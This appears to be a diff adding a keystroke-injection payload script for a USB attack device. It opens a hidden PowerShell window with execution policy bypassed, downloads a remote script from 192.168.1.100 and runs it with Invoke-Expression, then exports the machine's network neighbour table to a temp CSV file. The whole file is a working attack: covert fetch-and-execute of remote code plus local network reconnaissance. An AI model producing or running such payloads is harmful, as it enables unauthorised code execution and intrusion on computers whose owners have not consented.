@@ -1,0 +1,15 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Network scanner
+STRING $NetworkScan = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.100/scanner.ps1')"
+ENTER
+DELAY 500
+STRING $NetworkScan | Invoke-Expression
+ENTER
+DELAY 500
+STRING Start-Job -ScriptBlock { Get-NetNeighbor -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias,State | Export-Csv -Path "$env:TEMP\network_scan.csv" -NoTypeInformation }
+ENTER
